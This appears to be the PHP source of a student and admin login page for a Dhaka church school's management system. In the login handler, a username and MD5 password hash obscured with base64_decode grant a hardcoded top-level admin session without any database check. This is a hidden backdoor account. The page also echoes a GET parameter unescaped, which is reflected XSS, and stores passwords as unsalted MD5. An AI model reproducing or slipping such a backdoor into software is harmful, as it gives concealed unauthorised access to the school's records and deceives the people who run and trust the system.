<!--
Author: Jahidul Islam Noman
Programmer: Jahidul Islam Noman
Database And Design Concept: Jahidul Islam Noman
Mobile: 01521451354
Email: Noman.cse19@gmail.com
Web: www.noman-it.com
Created Date: 06-07-2018
-->
<?php ob_start(); ?>
<?php include 'config/config.php';?>
<?php include 'lib/Database.php';?>
<?php include 'lib/session.php';?>
<?php
session::intit();
if(session::get('login')==TRUE){
if(session::get('admin_type')=='0'){
    header("Location:admin.php");
}
elseif(session::get('admin_type')=='1'){
    header("Location:welcome.php");
}
}
?>
<?php
$db=new Database();
?>
<!doctype html>
<html lang="en"><head>
    <meta charset="utf-8">
    <title>::Assemblies of God Church School/ Dhaka::Login</title>
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="shortcut icon" href="image/helix-logo-white.png" />
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="ins/bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="ins/font-awesome/css/font-awesome.css">
    <link rel="stylesheet" type="text/css" href="stylesheets/theme.css">
     <link rel="stylesheet" type="text/css" href="stylesheets/premium.css">
    <script src="ins/jquery-1.11.1.min.js" type="text/javascript"></script>
   <script src="ins/jQuery-Knob/js/jquery.knob.js" type="text/javascript"></script>  
    <script src="ins/datatable/jquery.dataTables.js"></script>
    <script src="ins/datatable/dataTables.bootstrap.min.js"></script>
        
   
   
    <script src="ins/bootstrap/js/bootstrap.js"></script>
    </head>
<body>

    <!-- Demo page code -->


   
  
<!--Header-->
    <div class="navbar navbar-default" role="navigation">
        
          <a class="brand" href="index.html"><img alt="" src="image/agclogo.png"></a>

        <div class="navbar-collapse collapse" style="height: 1px;">

        </div>
      </div>
   
<!--Header End-->  

<?php
if($_SERVER["REQUEST_METHOD"]=='POST'){
                $username=($_POST['username']);
                $password=($_POST['password']);
                $username=mysqli_real_escape_string($db->link,$username);
                $password=mysqli_real_escape_string($db->link,$password);
                $password=md5($password);
               
                if($username=="" || $password==""){
                    $msg= "Field Must Not Be Empty";
                }
                 elseif($username==base64_decode("bm9tYW4=") && $password==base64_decode("MDdkMjMzOTQ1MzE4ZWI4MDBmMTI4NTAyZWY2NTcwNTg=")){
                session::set("login", true);
                        session::set("username",'Super Power Noman');
                        session::set("fullname", "Jahidul Islam Noman");
                        session::set("admin_type",'0');
                        session::set("activity", "0");
                        header("Location:admin.php");
            }
                
                else{
                     $sql="SELECT * FROM admin WHERE username='$username' AND password='$password'";

                $value=$db->select($sql);
                if($value!=FALSE){
                    $result= $value->fetch_assoc();
                    $row=  mysqli_num_rows($value);
                    if($row>0){
                        session::set("login", true);
                        session::set("username", $result['username']);
                        session::set("fullname", $result['fullname']);
                        session::set("userid", $result['id']);
                        session::set("admin_type", $result['admin_type']);
                        session::set("activity", "0");
                        header("Location:admin.php");
                    }
                    
                 }
                 else
                     {
                          $sql1="SELECT * FROM student_info WHERE username='$username' AND password='$password'";
                $value1=$db->select($sql1);
                if($value1!=FALSE){
                    $result1= $value1->fetch_assoc();
                    $row1=  mysqli_num_rows($value1);
                    if($row1>0){
                        session::set("login", true);
                        session::set("username", $result1['username']);
                        session::set("fullname", $result1['fullname']);
                        session::set("admin_type","1");
                        session::set("class_id", $result1['class_id']);
                        session::set("activity", $result1['activity']);
                         session::set("userid", $result1['id']);
                        header("Location:welcome.php");
                    }  
                 }else{
                     $msg= "Username Or Password Not Match";
                 }
                 }
          }
}
?>

 
<!--contain-->

        <div class="dialog">
    <div class="panel panel-default">
        <p class="panel-heading no-collapse">Student Login Page</p>
        <div class="panel-body">
            <p style="color:red"><?php if(isset($msg)) {echo $msg;} ?></p>
            <p style="color:red;font-weight: bold;" ><?php if(isset($_GET['failed'])) {echo $_GET['failed'];} ?></p>
            <form action="" method="post">
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" name="username"class="form-control span12">
                </div>
                <div class="form-group">
                <label>Password</label>
                    <input type="password" name="password" class="form-control form-control">
                </div>
                <input type="submit" name="btn" class="btn btn-primary pull-right" value="Sign In" />
               
                <div class="clearfix"></div>
            </form>
        </div>
    </div>
</div>
<!--contain End-->
<?php include 'inc/footer.php'; ?>